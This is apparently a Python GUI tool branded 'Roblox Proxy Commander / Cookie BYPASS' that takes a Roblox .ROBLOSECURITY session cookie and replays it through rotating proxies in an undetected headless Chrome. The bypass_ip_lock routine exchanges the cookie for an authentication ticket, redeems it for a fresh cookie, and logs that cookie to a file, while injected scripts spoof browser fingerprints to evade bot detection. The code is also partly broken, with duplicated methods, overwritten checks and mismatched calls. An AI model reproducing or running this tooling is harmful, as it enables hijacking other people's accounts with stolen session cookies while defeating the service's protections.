import tkinter as tk
from tkinter import filedialog, messagebox
from typing import Self
from weakref import proxy
import customtkinter as ctk
from matplotlib.artist import get
import requests
import threading
import random
import os
from datetime import datetime
import time
import pygame
import undetected_chromedriver as uc
import fake_useragent
import socket
import ssl
import logging
import sys
import json
import platform
from urllib3.exceptions import InsecureRequestWarning
import warnings
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
import base64



class RobloxProxyCommander:
    def __init__(self):
        self.setup_logging()
        self.root = ctk.CTk()
        self.root.title("R0BL0X PR0XY C0MMANDER|Cookie BYPASS v4.2 - TheZ ")
        self.root.geometry("1000x800")
        ctk.set_appearance_mode("dark")
        self.proxies = []
        self.working_proxies = []
        self.cookie = None
        self.running = False
        self.success_count = 0
        self.retry_count = 3
        self.timeout = 30
        self.headless_mode = True
        self.auto_retry = True
        self.proxy_rotation_interval = 300
        self.session_tokens = {}
        self.initialize_sounds()
        self.setup_gui()
        self.start_matrix_effect()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.root.iconbitmap("icon.ico")
        self.setup_session_manager()
    
    def setup_logging(self):
        logging.basicConfig(
            filename='roblox_commander.log',
            level=logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def initialize_sounds(self):
        pygame.mixer.init()
        self.click_sound = pygame.mixer.Sound("click.mp3")
        self.success_sound = pygame.mixer.Sound("success.wav")
        self.error_sound = pygame.mixer.Sound("error.mp3")

    def setup_gui(self):
        self.header = ctk.CTkLabel(
        self.root,
        text="[ R0BL0X PR0XY C0MMANDER - THEZ ]",
        font=("Terminal", 30),
        text_color="#00ff00"
    )
        self.header.pack(pady=20)

        counter_frame = ctk.CTkFrame(self.root)
        counter_frame.pack(pady=5)
    
        self.proxy_count_label = ctk.CTkLabel(
        counter_frame,
        text="PR0XIES: 0",
        font=("Terminal", 14),
        text_color="#00ff00"
    )
        self.proxy_count_label.pack(side=tk.LEFT, padx=10)
    
        self.success_count_label = ctk.CTkLabel(
        counter_frame,
        text="SUCCESS: 0",
        font=("Terminal", 14),
        text_color="#00ff00"
    )
        self.success_count_label.pack(side=tk.LEFT, padx=10)

    # Add region selector frame
        region_frame = ctk.CTkFrame(self.root)
        region_frame.pack(pady=5)
    
        self.region_vars = {
        'US': ctk.BooleanVar(value=True),
        'EU': ctk.BooleanVar(value=True),
        'ASIA': ctk.BooleanVar(value=True),
        'SA': ctk.BooleanVar(value=False),
        'OCE': ctk.BooleanVar(value=False),
        'AF': ctk.BooleanVar(value=False),
    }
    
        ctk.CTkLabel(region_frame, text="SELECT REGIONS:", font=("Terminal", 12), text_color="#00ff00").pack(side=tk.LEFT)
    
        for region, var in self.region_vars.items():
            ctk.CTkCheckBox(
            region_frame, 
            text=region,
            variable=var,
            font=("Terminal", 12),
            text_color="#00ff00",
            fg_color="#00ff00",
            hover_color="#008800"
        ).pack(side=tk.LEFT, padx=5)
    
        self.cookie_entry = ctk.CTkEntry(
            self.root,
            width=500,
            height=40,
            placeholder_text="ENTER R0BL0X C00KIE...",
            font=("Terminal", 12)
    )
        self.cookie_entry.pack(pady=10)
    
        self.status = ctk.CTkTextbox(
            self.root,
        height=250,
        width=800,
        font=("Terminal", 12),
        text_color="#00ff00",
        fg_color="#001100"
    )
        self.status.pack(pady=10)

        self.proxy_display = ctk.CTkTextbox(
        self.root,
        height=200,
        width=800,
        font=("Terminal", 12),
        text_color="#00ffff",
        fg_color="#001111"
    )
        self.proxy_display.pack(pady=10)
    
        btn_frame = ctk.CTkFrame(self.root)
        btn_frame.pack(pady=10)
    
        buttons = [
        ("Load Proxies", self.load_proxies, "#00ff00"),
        ("Start Auth", self.start_auth, "#00ff00"),
        ("Stop", self.stop_auth, "#ff0000"),
        ("Help", self.show_help, "#0099ff"),
        ("Clear", self.clear_all, "#ff9900"),
        ("Auto Retry", self.toggle_auto_retry, "#FFA500")
    ]
    
        for text, command, color in buttons:
            ctk.CTkButton(
                btn_frame,
                text=text,
                command=command,
                font=("Terminal", 12),
                fg_color=color,
                hover_color=self.adjust_color_brightness(color, -30)
            ).pack(side=tk.LEFT, padx=5)

    def authenticate_with_proxy(self, proxy):
        try:
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                formatted_proxy = f"http://{user}:{password}@{ip}:{port}"
            else:
                self.log_error(f"Invalid proxy format: {proxy}")
                return False

            driver = self.create_browser_session(formatted_proxy)
            if not driver:
                return False

            try:
                original_cookie = self.cookie_entry.get()
                new_cookie = self.bypass_ip_lock(original_cookie)

                if new_cookie:
                    self.cookie_entry.delete(0, tk.END)
                    self.cookie_entry.insert(0, new_cookie)
                    self.log("Using bypassed cookie for authentication", "#00ff00")

                selected_regions = [
                    region for region, var in self.region_vars.items() 
                    if var.get()
            ]
            
                if not selected_regions:
                    self.log("SELECT AT LEAST ONE REGION!", "#ff0000")
                    return False

                for region in selected_regions:
                    driver.get(f'https://{region.lower()}.roblox.com')
                    self.inject_advanced_cookies(driver, region)

                    if self.verify_session(driver, region):
                        self.success_count += 1
                        self.update_success_count()
                        self.log(f"Successfully authenticated in {region} region", "#00ff00")
                        self.session_tokens[region] = self.extract_session_token(driver)
                        self.success_sound.play()

                return True

            finally:
                driver.quit()

        except Exception as e:
            self.log_error(f"Authentication failed: {str(e)}")
            return False

    def setup_session_manager(self):
        self.session_manager = requests.Session()
        self.session_manager.verify = False
        self.session_manager.timeout = self.timeout
        self.session_manager.headers = self.get_advanced_headers()

    def get_advanced_headers(self):
        return {
            'User-Agent': fake_useragent.UserAgent().random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'DNT': '1',
            'Sec-GPC': '1',
            'X-CSRF-TOKEN': self.generate_verification_token()
        }

    def show_help(self):
        self.click_sound.play()
        help_window = ctk.CTkToplevel(self.root)
        help_window.title("C0MMANDER HELP")
        help_window.geometry("600x400")
        help_window.resizable(False, False)
        help_window.attributes('-topmost', True)
        help_window.iconbitmap("icon.ico")
    
        help_text = """
    [ R0BL0X PR0XY C0MMANDER HELP ]
    
    1. LOAD PROXIES BUTTON
    - Loads proxy list from a text file
    - Format: ip:port (one per line)
    - Automatically verifies working proxies
    
    2. COOKIE ENTRY
    - Enter your Roblox .ROBLOSECURITY cookie
    - Keep this secure and private
    - Supports multi-region bypass
    
    3. START AUTH BUTTON
    - Begins advanced authentication process
    - Uses only verified working proxies
    - Maintains persistent sessions
    
    4. STOP BUTTON
    - Halts all authentication processes
    - Safely terminates connections
    - Preserves proxy list
    
    5. HEADLESS MODE            (This Feature is not Available For this Version!)
    - Toggle browser visibility
    - Faster performance when enabled
    - Use visible mode for debugging
    
    6. AUTO RETRY
    - Automatically removes failed proxies
    - Maintains proxy quality
    - Ensures reliable connections
    
    7. STATUS DISPLAY
    - Green: Success
    - Red: Failed attempts
    - Yellow: System messages
    
    8. PROXY DISPLAY
    - Shows verified working proxies
    - Updates in real-time
    - Displays connection status
    
    [ SECURITY WARNING ]
    Never share your cookie or proxy list
    Always use private proxies
    Monitor authentication attempts
    """
    
        help_display = ctk.CTkTextbox(
            help_window,
            width=550,
            height=350,
            font=("Terminal", 12),
            text_color="#00ff00"
        )
        help_display.pack(padx=20, pady=20)
        help_display.insert("1.0", help_text)
        help_display.configure(state="disabled")

    def start_auth(self):
        self.click_sound.play()
        if not self.cookie_entry.get():
            self.log("Please enter a cookie first!", "#ff0000")
            self.error_sound.play()
            return
            
        if not self.working_proxies:
            self.log("No valid proxies available!", "#ff0000")
            self.error_sound.play()
            return
            
    def auth_loop(self):
        self.running = True
        while self.running and self.working_proxies:
            proxy = random.choice(self.working_proxies)
            if self.authenticate_with_proxy(proxy):
                time.sleep(random.uniform(2, 5))
            elif self.auto_retry:
                self.working_proxies.remove(proxy)
                self.log(f"Removed failed proxy: {proxy}", "#ffff00")
        
    def start_auth(self):
        self.auth_thread = threading.Thread(target=self.auth_loop)
        self.auth_thread.start()
        self.log("Advanced authentication process started", "#00ff00")


    def toggle_headless(self):
        self.headless_mode = not self.headless_mode
        self.log(f"Headless mode: {'ON' if self.headless_mode else 'OFF'}", "#00ff00")
        self.click_sound.play()

    def toggle_auto_retry(self):
        self.auto_retry = not self.auto_retry
        self.log(f"Auto retry: {'ON' if self.auto_retry else 'OFF'}", "#00ff00")
        self.click_sound.play()

    

    def inject_anti_detection_scripts(self, driver):
        try:
            driver.get("https://www.roblox.com")

            driver.execute_script("""
            // Disable WebDriver detection
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            window.navigator.chrome = {runtime: {}};
            window.navigator.language = 'en-US';
            window.navigator.languages = ['en-US', 'en'];
            window.navigator.hardwareConcurrency = 4;
            window.navigator.deviceMemory = 8;

            // Fake navigator properties for added stealth
            if (window.navigator.plugins.length === 0) {
                Object.defineProperty(navigator, 'plugins', {get: function() { return [{name: 'Chrome PDF Plugin'}, {name: 'Native Client'}, {name: 'Chrome PDF Viewer'}]; }});
            }

            // Simulate normal screen size and hardware
            Object.defineProperty(screen, 'width', {get: function() { return 1920; }});
            Object.defineProperty(screen, 'height', {get: function() { return 1080; }});
            Object.defineProperty(screen, 'availWidth', {get: function() { return 1920; }});
            Object.defineProperty(screen, 'availHeight', {get: function() { return 1040; }});

            // Fake touchscreen device
            Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 1});
            Object.defineProperty(navigator, 'touchPoints', {get: () => 1});

            // Fake window size and mouse event presence
            window.innerWidth = 1920;
            window.innerHeight = 1080;
            window.MouseEvent = function() {};

            // Fake IndexedDB and LocalStorage for anti-bot systems
            window.indexedDB = window.indexedDB || {};
            window.localStorage = window.localStorage || {};
            window.sessionStorage = window.sessionStorage || {};
            window.history.pushState = window.history.pushState || function() {};
        """)
            self.log("Anti-detection scripts successfully injected.", "#00ff00")
        except Exception as e:
            self.log_error(f"Failed to inject anti-detection scripts: {e}")



    def inject_advanced_cookies(self, driver, region):
        try:
            cookie_value = self.cookie_entry.get()
            timestamp = int(time.time())
        
            security_tokens = {
            '.ROBLOSECURITY': cookie_value,
            'RBXEventTrackerV2': f'CreateDate={timestamp}',
            'GuestData': f'UserID=-{random.randint(1000000, 9999999)}',
            'RBXSource': f'rbx_acquisition_time={timestamp}',
            'RBXViralAcquisition': f'time={timestamp}',
            'RBXSessionTracker': f'{random.randint(100000, 999999)}',
            '__RequestVerificationToken': self.generate_verification_token(),
            'rbx-ip2': self.generate_ip2_token(),
            'AuthToken': self.generate_auth_token(),
            'RegionContext': region,
            'RBXRegion': region,
            'RBXLocale': self.get_region_locale(region)
        }
        
            for name, value in security_tokens.items():
                driver.execute_cdp_cmd('Network.setCookie', {
                'domain': f'.{region.lower()}.roblox.com',
                'name': name,
                'value': value,
                'path': '/',
                'secure': True,
                'httpOnly': True if name in ['.ROBLOSECURITY', 'AuthToken'] else False,
                'sameSite': 'None'
            })
            
            self.inject_anti_detection_scripts(driver)
        
        except Exception as e:
            self.log_error(f"Advanced cookie injection failed: {str(e)}")

    def generate_verification_token(self):
        return ''.join(random.choices('0123456789abcdef', k=32))

    def generate_ip2_token(self):
        return ''.join(random.choices('0123456789ABCDEF', k=16))

    def generate_auth_token(self):
        chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        return ''.join(random.choices(chars, k=24))
    
    

    def verify_proxies(self):
        total_proxies = len(self.proxies)
        self.log(f"Starting verification of {total_proxies} proxies...", "#ffff00")
        for proxy in self.proxies:
            self.verify_proxy_connection(proxy)
        self.log(f"Verification complete. {len(self.working_proxies)} proxies are working.", "#00ff00")
        self.update_proxy_count()
        self.update_proxy_display()



    def verify_proxy_connection(self, proxy):
        try:
            parts = proxy.split(':')
            if len(parts) == 4:  
                ip, port, user, password = parts
                proxy_url = f"http://{user}:{password}@{ip}:{port}"
            else:
                self.log(f"Invalid proxy format: {proxy}", "#ff0000")
                return False

            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }

            test_endpoints = [
                'https://www.roblox.com/home',
                'https://economy.roblox.com/v1/user/currency',
                'https://auth.roblox.com/v2/logout',
                'https://api.roblox.com/currency/balance',
                'https://www.google.com'
            ]

            success_count = 0
            for endpoint in test_endpoints:
                try:
                    response = requests.get(
                        endpoint,
                        proxies=proxies,
                        timeout=10,
                        verify=False,
                        headers=self.get_advanced_headers()
                    )
                    if response.status_code in [200, 302, 403]:
                        success_count += 1
                        if success_count >= 2:
                            break
                except requests.exceptions.RequestException as e:
                    self.logger.debug(f"Proxy {proxy} failed on {endpoint}: {e}")
                    continue

            if success_count >= 1:
                self.working_proxies.append(proxy)
                self.log(f"Verified working proxy: {proxy}", "#00ff00")
                return True

            return False
        except Exception as e:
            self.log(f"Proxy verification failed for {proxy}: {e}", "#ff0000")
            return False


    def load_proxies(self):
        file_path = filedialog.askopenfilename(
            title="Select Proxy List",
            filetypes=[("Text Files", "*.txt")]
        )
        if file_path:
            with open(file_path, 'r') as file:
                self.proxies = [line.strip() for line in file if line.strip()]
            self.log(f"Loaded {len(self.proxies)} proxies.", "#00ff00")

        threading.Thread(target=self.verify_proxies, daemon=True).start()

    
    def verify_session(self, region, proxy):
        try:
            formatted_proxy = self.format_proxy(proxy)
            proxies = {
            'http': formatted_proxy,
            'https': formatted_proxy
        }
        
            cookie_value = self.cookie_entry.get().strip()
        
            headers = self.get_advanced_headers()
            headers.update({
            'Roblox-Region': str(region),
            'X-Roblox-Region': str(region)
        })
        
            cookies = {'.ROBLOSECURITY': cookie_value}
        
            response = requests.get(
            'https://www.roblox.com/mobileapi/userinfo',
            cookies=cookies,
            headers=headers,
            timeout=10,
            proxies=proxies,
            verify=False
        )
        
            if response.status_code == 200:
                self.log(f"Session verified in {region}", "#00ff00")
                return True
            
            return False
        
        except Exception as e:
            self.log(f"Session verification failed in {region}: {str(e)}", "#ff0000")
            return False

    def format_proxy(self, proxy):
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, password = parts
            return f"http://{user}:{password}@{ip}:{port}"
        return None

    def inject_cookies(self, driver):
        try:
        # First navigate to Roblox
            driver.get('https://www.roblox.com')
            time.sleep(2)
        
            roblox_cookie = self.cookie_entry.get()
            if not roblox_cookie:
                self.log("No cookie provided for injection", "#ff0000")
                return False

            driver.execute_cdp_cmd('Network.setCookie', {
            'name': '.ROBLOSECURITY',
            'value': roblox_cookie,
            'domain': 'roblox.com',
            'path': '/',
            'secure': True,
            'httpOnly': True,
            'sameSite': 'None'
        })

            self.log("Cookie successfully injected", "#00ff00")
            return True

        except Exception as e:
            self.log_error(f"Failed to inject cookies: {e}")
            return False

    def inject_anti_detection_scripts(self, driver):
        try:
            driver.get("https://www.roblox.com")
            driver.execute_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
            Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
            Object.defineProperty(screen, 'width', {get: () => 1920});
            Object.defineProperty(screen, 'height', {get: () => 1080});
        """)
        
            self.log("Anti-detection scripts successfully injected", "#00ff00")
            return True
        
        except Exception as e:
            self.log_error(f"Failed to inject anti-detection scripts: {e}")
            return False

    def stop_auth(self):
        self.click_sound.play()
        self.running = False
        self.log("Stopping authentication process...", "#ffff00")
    
        for region in self.session_tokens:
            self.session_tokens[region] = None
        
        self.success_count = 0
        self.update_success_count()


    def get_region_locale(self, region):
    # Map each region to a locale string
        region_locales = {
        'US': 'en-US',
        'EU': 'en-GB',
        'ASIA': 'en-SG',
        'www': 'en-US'  # Default locale
    }
        return region_locales.get(region.upper(), 'en-US')  
    
    def bypass_ip_lock(self, cookie):
        """
        Bypasses Roblox's IP lock by generating a valid authentication ticket
        and redeeming it for a new session.
        
        Args:
            cookie (str): The .ROBLOSECURITY cookie for authentication.

        Returns:
            str: The new .ROBLOSECURITY cookie after bypassing IP lock.
        """
        try:
            csrf_manager = CSRFManager(requests.Session())
            csrf_token = csrf_manager.get_valid_csrf_token(cookie)

            # Set headers
            headers = {
                "User-Agent": fake_useragent.UserAgent().random,
                "Content-Type": "application/json",
                "x-csrf-token": csrf_token,
            }

            # Request authentication ticket
            response = requests.post(
                "https://auth.roblox.com/v1/authentication-ticket",
                headers={
                    **headers,
                    "rbxauthenticationnegotiation": "1",
                    "referer": "https://www.roblox.com/camel"
                },
                cookies={".ROBLOSECURITY": cookie},
                verify=False
            )
            rbx_authentication_ticket = response.headers.get("rbx-authentication-ticket")

            if not rbx_authentication_ticket:
                self.log(f"Failed to fetch authentication ticket. Status Code: {response.status_code}", "#ff0000")
                return None

            # Redeem authentication ticket to bypass IP lock
            csrf_token = csrf_manager.get_valid_csrf_token(cookie)  # Refresh token
            headers["x-csrf-token"] = csrf_token

            response = requests.post(
                "https://auth.roblox.com/v1/authentication-ticket/redeem",
                headers={
                    "rbxauthenticationnegotiation": "1",
                    **headers
                },
                json={"authenticationTicket": rbx_authentication_ticket},
                verify=False
            )
            set_cookie_header = response.headers.get("set-cookie")

            if not set_cookie_header:
                self.log(f"Failed to retrieve new cookie. Status Code: {response.status_code}", "#ff0000")
                return None

            # Extract new cookie
            new_cookie = set_cookie_header.split(".ROBLOSECURITY=")[1].split(";")[0]

            # Save unblocked cookie with timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open("unblocked_cookies.txt", "a", encoding='utf-8') as f:
                f.write(f"[{timestamp}] {new_cookie}\n")
                f.write("-" * 100 + "\n")  # Separator line for readability

            self.log("Successfully bypassed IP lock and saved to unblocked_cookies.txt", "#00ff00")
            if self.success_sound:
                self.success_sound.play()
            return new_cookie

        except requests.exceptions.RequestException as e:
            self.log(f"Network error during IP bypass: {str(e)}", "#ff0000")
            return None
        except Exception as e:
            self.log(f"IP bypass failed: {str(e)}", "#ff0000")
            return None

    def start_matrix_effect(self):
        def matrix_loop():
            matrix_chars = "10ABCDEF"
            colors = ["#00ff00", "#00dd00", "#00bb00"]
            while True:
                if not self.running:
                    break
                try:
                    position = random.randint(0, 100)
                    char = random.choice(matrix_chars)
                    color = random.choice(colors)
                    self.status.tag_configure(f"color_{position}", foreground=color)
                    self.status.insert("end", char, f"color_{position}")
                    if self.status.index("end-1c").split(".")[0] > "1000":
                        self.status.delete("1.0", "2.0")
                    self.status.see("end")
                    time.sleep(0.05)
                except:
                    continue

        threading.Thread(target=matrix_loop, daemon=True).start()



    def adjust_color_brightness(self, hex_color, factor):
        hex_color = hex_color.lstrip('#')
        rgb = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        new_rgb = [max(0, min(255, c + factor)) for c in rgb]
        return '#{:02x}{:02x}{:02x}'.format(*new_rgb)

    def update_proxy_count(self):
        self.proxy_count_label.configure(text=f"PR0XIES: {len(self.proxies)}")

    def update_success_count(self):
        self.success_count_label.configure(text=f"SUCCESS: {self.success_count}")

    def update_proxy_display(self):
        self.proxy_display.delete("1.0", tk.END)
        for proxy in self.proxies:
            self.proxy_display.insert("end", f"{proxy}\n")

    def log(self, message, color="#00ff00"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.status.insert("end", f"[{timestamp}] {message}\n")
        self.status.see("end")
    
    
    def create_browser_session(self, proxy):
        try:
            options = uc.ChromeOptions()
        
            parts = proxy.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
            
                options.add_argument(f'--proxy-server=http://{ip}:{port}')
                options.add_argument(f'--proxy-auth={user}:{password}')
        
            if self.headless_mode:
                options.add_argument('--headless=new')
        
            options.add_argument('--disable-gpu')
            options.add_argument('--no-sandbox')
            options.add_argument('--ignore-certificate-errors')
        
            driver = uc.Chrome(options=options)
            driver.set_page_load_timeout(30)
        
            return driver

        except Exception as e:
            self.log_error(f"Browser session creation failed: {e}")
            return None

    
    def log_error(self, message):
        self.logger.error(message)
        self.log(message, "#ff0000")
        self.error_sound.play()

    def clear_all(self):
        self.click_sound.play()
        self.proxies = []
        self.success_count = 0
        self.status.delete("1.0", tk.END)
        self.proxy_display.delete("1.0", tk.END)
        self.update_proxy_count()
        self.update_success_count()
        self.log("All data cleared", "#ffff00")

    def stop_auth(self):
        self.click_sound.play()
        self.running = False
        self.log("Stopping authentication process...", "#ffff00")

    def on_closing(self):
        if messagebox.askokcancel("Quit", "Do you want to exit?"):
            self.running = False
            time.sleep(1)
            self.root.destroy()
            self.pixel_fade_out()
            sys.exit(0)

    def pixel_fade_in(self):
        width = self.root.winfo_width()
        height = self.root.winfo_height()
    
    def pixel_fade_in(self):
        width = self.root.winfo_width()
        height = self.root.winfo_height()
        self.fade_canvas = tk.Canvas(self.root, width=width, height=height, 
                               highlightthickness=0, bg='black')
        self.fade_canvas.place(x=0, y=0)
    
        self.pixels = []
        pixel_size = 4
        for y in range(0, height, pixel_size):
            for x in range(0, width, pixel_size):
                pixel = self.fade_canvas.create_rectangle(
                    x, y, x+pixel_size, y+pixel_size, 
                    fill='black', outline='')
                self.pixels.append(pixel)
    
    def fade_out_pixel(self):
        if self.pixels:
            pixel = random.choice(self.pixels)
            self.fade_canvas.delete(pixel)
            self.pixels.remove(pixel)
            self.root.after(1, self.fade_out_pixel)
        else:
            self.fade_canvas.destroy()
    
        self.root.after(100, self.fade_out_pixel)
    def pixel_fade_out(self):
        width = self.root.winfo_width()
        height = self.root.winfo_height()
    
        self.fade_canvas = tk.Canvas(self.root, width=width, height=height,
                               highlightthickness=0)
        self.fade_canvas.place(x=0, y=0)
    
        self.pixels = []
        pixel_size = 4
        for y in range(0, height, pixel_size):
            for x in range(0, width, pixel_size):
                pixel = self.fade_canvas.create_rectangle(
                    x, y, x+pixel_size, y+pixel_size,
                    fill='black', outline='', state='hidden')
                self.pixels.append(pixel)
    
        def fade_in_pixel():
            if self.pixels:
                pixel = random.choice(self.pixels)
                self.fade_canvas.itemconfig(pixel, state='normal')
                self.pixels.remove(pixel)
                self.root.after(1, fade_in_pixel)
            else:
                self.root.destroy()
    
        self.root.after(100, fade_in_pixel)

    def on_closing(self):
        if messagebox.askokcancel("Quit", "Do you want to exit?"):
            self.running = False
            time.sleep(1)
        #   self.pixel_fade_out()  # type: ignore
            self.root.destroy()
            sys.exit(0.2)

    def run(self):
        self.root.update() 
    #   self.pixel_fade_in()  # type: ignore
        self.root.mainloop()

class CSRFManager:
    def __init__(self, session):
        self.session = session
        self.current_token = None
        self.last_refresh_time = None

class CSRFManager:
    def __init__(self, session):
        """
        CSRFManager handles fetching and refreshing CSRF tokens for authenticated sessions.
        """
        self.session = session
        self.current_token = None
        self.last_refresh_time = None

    def fetch_csrf_token(self, cookie):
        """
        Fetches a fresh CSRF token from Roblox servers.
        Args:
            cookie (str): The .ROBLOSECURITY cookie for authentication.

        Returns:
            str: The CSRF token.
        """
        try:
            headers = {
                "User-Agent": fake_useragent.UserAgent().random,
                "Content-Type": "application/json",
            }
            response = self.session.post(
                "https://auth.roblox.com/v2/logout",
                cookies={".ROBLOSECURITY": cookie},
                headers=headers,
                verify=False
            )

            if response.status_code != 200:
                raise Exception(f"Failed to fetch CSRF token. Status Code: {response.status_code}")
            
            token = response.headers.get("x-csrf-token")
            if not token:
                raise Exception("CSRF token not found in response headers")
            
            self.current_token = token
            self.last_refresh_time = time.time()
            return token

        except Exception as e:
            raise Exception(f"Error fetching CSRF token: {str(e)}")

    def get_valid_csrf_token(self, cookie):
        """
        Ensures that a valid CSRF token is available.
        If the current token is expired or not available, it fetches a new one.
        
        Args:
            cookie (str): The .ROBLOSECURITY cookie for authentication.

        Returns:
            str: A valid CSRF token.
        """
        # Refresh token if expired or not available
        if not self.current_token or (time.time() - self.last_refresh_time > 30):
            return self.fetch_csrf_token(cookie)
        return self.current_token